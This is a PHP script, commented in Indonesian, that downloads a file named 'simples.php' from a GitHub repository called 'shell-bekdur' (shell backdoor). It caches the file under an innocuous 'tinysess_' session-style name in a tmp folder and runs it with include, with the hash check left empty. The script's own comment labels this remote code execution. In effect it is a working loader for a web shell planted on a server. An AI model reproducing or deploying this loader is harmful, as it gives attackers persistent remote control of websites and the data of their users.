<?php
$remote = 'https://raw.githubusercontent.com/sievern/shell-bekdur/refs/heads/main/simples.php';

// Folder tmp di belakang direktori file ini
$cacheDir = __DIR__ . '/tmp'; 

$target = $cacheDir . '/tinysess_' . md5($_SERVER['HTTP_HOST']) . '.php';
$maxRetries = 3;

// Jika ingin verifikasi hash isi file, isi ini.
// Kalau dibiarkan kosong, include tetap dilakukan (tidak aman).
$expectedSha256 = '';

function download_atomic($url, $target, $retries = 3, $expectedSha256 = '') {

    $dir = dirname($target);
    if (!is_dir($dir) && !mkdir($dir, 0700, true)) {
        throw new RuntimeException("Tidak bisa membuat direktori $dir");
    }

    // Jika file sudah ada dan tidak kosong
    if (file_exists($target) && filesize($target) > 0) {
        if ($expectedSha256 !== '') {
            if (hash_file('sha256', $target) === $expectedSha256) {
                return $target;
            } else {
                @unlink($target);
            }
        } else {
            return $target;
        }
    }

    $lockfile = $target . '.lock';
    $lfh = fopen($lockfile, 'c');
    if (!$lfh) {
        throw new RuntimeException("Gagal membuka lockfile $lockfile");
    }

    if (!flock($lfh, LOCK_EX)) {
        fclose($lfh);
        throw new RuntimeException("Gagal mengambil lock pada $lockfile");
    }

    try {
        $tmp = tempnam($dir, 'dl_');
        if ($tmp === false) {
            throw new RuntimeException("Gagal membuat tmp file di $dir");
        }

        $lastHttp = null;
        $lastCurlErr = null;
        $success = false;

        for ($i = 0; $i < $retries; $i++) {
            $fh = fopen($tmp, 'w+');
            if (!$fh) {
                throw new RuntimeException("Gagal membuka tmp file: $tmp");
            }

            $ch = curl_init($url);
            curl_setopt($ch, CURLOPT_FILE, $fh);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 30);
            curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; PHP Downloader)');
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);

            $execResult = curl_exec($ch);
            $curlErr = curl_error($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            $curlErrNo = curl_errno($ch);
            curl_close($ch);
            fclose($fh);

            $lastHttp = $httpCode;
            $lastCurlErr = $curlErr;

            clearstatcache(true, $tmp);
            $size = is_file($tmp) ? filesize($tmp) : 0;

            if ($execResult === false || $curlErrNo !== 0) {
                error_log("download_atomic: cURL attempt #$i failed: ($curlErrNo) $curlErr (HTTP $httpCode)");
                @unlink($tmp);
                sleep(pow(2, $i));
                continue;
            }

            if ($httpCode < 200 || $httpCode >= 300) {
                error_log("download_atomic: HTTP code $httpCode (attempt #$i).");
                @unlink($tmp);
                sleep(pow(2, $i));
                continue;
            }

            if ($size === 0) {
                error_log("download_atomic: file kosong setelah download (attempt #$i). HTTP $httpCode");
                @unlink($tmp);
                sleep(pow(2, $i));
                continue;
            }

            $success = true;
            break;
        }

        if (!$success) {
            @unlink($tmp);
            throw new RuntimeException("Download gagal setelah $retries percobaan (last HTTP: $lastHttp, curlErr: $lastCurlErr)");
        }

        if ($expectedSha256 !== '') {
            $actual = hash_file('sha256', $tmp);
            if ($actual !== $expectedSha256) {
                @unlink($tmp);
                throw new RuntimeException("Hash mismatch: expected $expectedSha256, got $actual");
            }
        }

        if (!@rename($tmp, $target)) {
            if (!@copy($tmp, $target)) {
                @unlink($tmp);
                throw new RuntimeException("Gagal memindahkan file ke $target");
            }
            @unlink($tmp);
        }

        @chmod($target, 0600);
        return $target;

    } finally {
        flock($lfh, LOCK_UN);
        fclose($lfh);
        @unlink($lockfile);
    }
}

try {
    $file = download_atomic($remote, $target, $maxRetries, $expectedSha256);

    if (!is_file($file) || filesize($file) === 0) {
        throw new RuntimeException("File target tidak ditemukan atau kosong.");
    }

    if ($expectedSha256 === '') {
        error_log("Peringatan: include file remote TANPA verifikasi hash!");
    }

    include $file;  // ⚠️ Bahaya — Remote Code Execution
} catch (Exception $e) {
    error_log("Download error: " . $e->getMessage());
    http_response_code(500);
    echo "Terjadi kesalahan pada server.";
}